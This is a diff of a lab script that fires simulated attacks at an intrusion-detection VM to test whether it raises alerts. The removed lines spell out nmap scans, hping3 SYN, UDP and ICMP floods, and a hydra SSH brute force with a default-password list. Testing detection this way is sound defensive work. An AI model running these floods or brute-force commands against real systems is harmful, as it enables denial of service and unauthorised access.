@@ -1,88 +1,145 @@
 #!/bin/bash
-# ============================================================
 # simulate_attacks.sh
-# Run this on the ATTACKER VM to simulate attacks against
-# the MAIN VM (IDS host). Used to test live detection.
-#
-# USAGE:
-#   chmod +x scripts/simulate_attacks.sh
-#   ./scripts/simulate_attacks.sh <TARGET_IP>
-#
-# Example:
-#   ./scripts/simulate_attacks.sh 192.168.64.2
-# ============================================================
+# Master attack simulation script
+# Runs all 5 attack scenarios sequentially against the target IDS VM
+# Usage: ./simulate_attacks.sh <target_ip>
 
-TARGET_IP="${1:-192.168.64.2}"    # replace with your main VM's IP
-DELAY=3                           # seconds between attack types
+TARGET_IP="${1:-192.168.64.2}"
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
-echo "============================================"
-echo " IDS Attack Simulation"
-echo " Target: $TARGET_IP"
-echo " WARNING: Only run in your private lab VMs!"
-echo "============================================"
-
-# ── Install tools on attacker VM ─────────────────────────
-echo "[SETUP] Installing attack tools..."
-sudo apt update -y -qq
-sudo apt install -y nmap hping3 hydra netcat-openbsd > /dev/null 2>&1
-
-# ── 1. Port Scan (nmap) ──────────────────────────────────
+echo "╔════════════════════════════════════════════════════════════╗"
+echo "║         OneMoney IDS Attack Simulation Suite               ║"
+echo "║         Target: $TARGET_IP                         ║"
+echo "╚════════════════════════════════════════════════════════════╝"
 echo ""
-echo "[ATTACK 1] Port Scan — nmap SYN scan..."
-nmap -sS -T4 -p 1-1000 "$TARGET_IP" -oN logs/portscan_results.txt
-echo "Port scan complete. Results in logs/portscan_results.txt"
-sleep "$DELAY"
 
-# ── 2. SYN Flood / DDoS simulation (hping3) ─────────────
-echo ""
-echo "[ATTACK 2] SYN Flood (15 seconds)..."
-echo "  hping3 → SYN packets to port 80 on $TARGET_IP"
-timeout 15 hping3 -S -p 80 --flood "$TARGET_IP" || true
-echo "SYN flood complete."
-sleep "$DELAY"
+if [ -z "$TARGET_IP" ] || [ "$TARGET_IP" == "--help" ] || [ "$TARGET_IP" == "-h" ]; then
+    echo "Usage: ./simulate_attacks.sh <target_ip>"
+    echo ""
+    echo "Example:"
+    echo "  ./simulate_attacks.sh 192.168.64.2"
+    echo ""
+    echo "This script runs 5 attack scenarios in sequence:"
+    echo "  1. Port Scan       - nmap scans all ports"
+    echo "  2. SYN Flood       - floods port 80 for 15 seconds"
+    echo "  3. SSH Brute Force - hydra tries common credentials"
+    echo "  4. UDP Flood       - floods port 53 for 10 seconds"
+    echo "  5. ICMP Flood      - ping flood for 10 seconds"
+    echo ""
+    exit 0
+fi
 
-# ── 3. SSH Brute Force (Hydra with common passwords) ────
+# Verify we can reach the target
+echo "[*] Verifying connectivity to $TARGET_IP..."
+if ! ping -c 1 -W 2 $TARGET_IP &> /dev/null; then
+    echo "[!] ERROR: Cannot reach $TARGET_IP"
+    echo "[!] Please verify the IP address and network connectivity"
+    exit 1
+fi
+echo "[✓] Target is reachable"
 echo ""
-echo "[ATTACK 3] SSH Brute Force simulation (Hydra)..."
-# Uses a tiny wordlist — for lab demo only
-cat > /tmp/lab_users.txt << 'EOF'
-root
-admin
-ubuntu
-user
-bella
-EOF
-cat > /tmp/lab_passwords.txt << 'EOF'
-password
-123456
-admin
-ubuntu
-test
-qwerty
-letmein
-EOF
-hydra -L /tmp/lab_users.txt -P /tmp/lab_passwords.txt \
-      ssh://"$TARGET_IP" -t 4 -V -f 2>/dev/null | tail -20 || true
-echo "SSH brute force simulation complete."
-sleep "$DELAY"
 
-# ── 4. UDP Flood ─────────────────────────────────────────
-echo ""
-echo "[ATTACK 4] UDP Flood (10 seconds)..."
-timeout 10 hping3 --udp -p 53 --flood "$TARGET_IP" || true
-echo "UDP flood complete."
-sleep "$DELAY"
+# Check if individual attack scripts exist
+for attack in attack_portscan attack_syn_flood attack_ssh_brute attack_udp_flood attack_icmp_flood; do
+    if [ ! -f "$SCRIPT_DIR/${attack}.sh" ]; then
+        echo "[!] ERROR: $SCRIPT_DIR/${attack}.sh not found"
+        exit 1
+    fi
+done
 
-# ── 5. ICMP Flood (ping flood) ───────────────────────────
+echo "[*] All attack scripts found. Starting simulations..."
 echo ""
-echo "[ATTACK 5] ICMP Flood (10 seconds)..."
-timeout 10 sudo hping3 --icmp --flood "$TARGET_IP" || true
-echo "ICMP flood complete."
 
+# ─────────────────────────────────────────────────────────────
+# Attack 1: Port Scan
+# ─────────────────────────────────────────────────────────────
 echo ""
-echo "============================================"
-echo " All attacks complete."
-echo " Check Kibana at http://$TARGET_IP:5601"
-echo " for detected alerts."
-echo " And the IDS dashboard at http://$TARGET_IP:8000"
-echo "============================================"
+echo "╔════════════════════════════════════════════════════════════╗"
+echo "║  ATTACK 1/5: Port Scan                                     ║"
+echo "║  Time: $(date)                               ║"
+echo "╚════════════════════════════════════════════════════════════╝"
+echo ""
+bash "$SCRIPT_DIR/attack_portscan.sh" $TARGET_IP
+echo ""
+echo "[*] Waiting 5 seconds before next attack..."
+sleep 5
+
+# ─────────────────────────────────────────────────────────────
+# Attack 2: SYN Flood
+# ─────────────────────────────────────────────────────────────
+echo ""
+echo "╔════════════════════════════════════════════════════════════╗"
+echo "║  ATTACK 2/5: SYN Flood (Port 80)                           ║"
+echo "║  Time: $(date)                               ║"
+echo "╚════════════════════════════════════════════════════════════╝"
+echo ""
+bash "$SCRIPT_DIR/attack_syn_flood.sh" $TARGET_IP 15
+echo ""
+echo "[*] Waiting 5 seconds before next attack..."
+sleep 5
+
+# ─────────────────────────────────────────────────────────────
+# Attack 3: SSH Brute Force
+# ─────────────────────────────────────────────────────────────
+echo ""
+echo "╔════════════════════════════════════════════════════════════╗"
+echo "║  ATTACK 3/5: SSH Brute Force                               ║"
+echo "║  Time: $(date)                               ║"
+echo "╚════════════════════════════════════════════════════════════╝"
+echo ""
+bash "$SCRIPT_DIR/attack_ssh_brute.sh" $TARGET_IP
+echo ""
+echo "[*] Waiting 5 seconds before next attack..."
+sleep 5
+
+# ─────────────────────────────────────────────────────────────
+# Attack 4: UDP Flood
+# ─────────────────────────────────────────────────────────────
+echo ""
+echo "╔════════════════════════════════════════════════════════════╗"
+echo "║  ATTACK 4/5: UDP Flood (Port 53)                           ║"
+echo "║  Time: $(date)                               ║"
+echo "╚════════════════════════════════════════════════════════════╝"
+echo ""
+bash "$SCRIPT_DIR/attack_udp_flood.sh" $TARGET_IP 10
+echo ""
+echo "[*] Waiting 5 seconds before next attack..."
+sleep 5
+
+# ─────────────────────────────────────────────────────────────
+# Attack 5: ICMP Flood
+# ─────────────────────────────────────────────────────────────
+echo ""
+echo "╔════════════════════════════════════════════════════════════╗"
+echo "║  ATTACK 5/5: ICMP Flood (Ping Flood)                       ║"
+echo "║  Time: $(date)                               ║"
+echo "╚════════════════════════════════════════════════════════════╝"
+echo ""
+bash "$SCRIPT_DIR/attack_icmp_flood.sh" $TARGET_IP 10
+echo ""
+
+# ─────────────────────────────────────────────────────────────
+# Summary
+# ─────────────────────────────────────────────────────────────
+echo ""
+echo "╔════════════════════════════════════════════════════════════╗"
+echo "║          All Attacks Completed Successfully                ║"
+echo "║  Time: $(date)                               ║"
+echo "╚════════════════════════════════════════════════════════════╝"
+echo ""
+echo "📊 NEXT STEPS:"
+echo "   1. Check the inference service logs on the main VM:"
+echo "      tail -f ~/predictive-ids/logs/inference.log"
+echo ""
+echo "   2. View alerts in Kibana:"
+echo "      http://192.168.64.2:5601 → Discover → ids-alerts"
+echo ""
+echo "   3. Check API stats:"
+echo "      curl http://192.168.64.2:8000/api/stats"
+echo ""
+echo "   4. View blocked IPs:"
+echo "      curl http://192.168.64.2:8000/api/blocked"
+echo ""
+echo "⚠️  NOTE: Some attacks require root privileges (hping3 etc)"
+echo "   If you see permission errors, run with sudo or check sudoers"
+echo ""
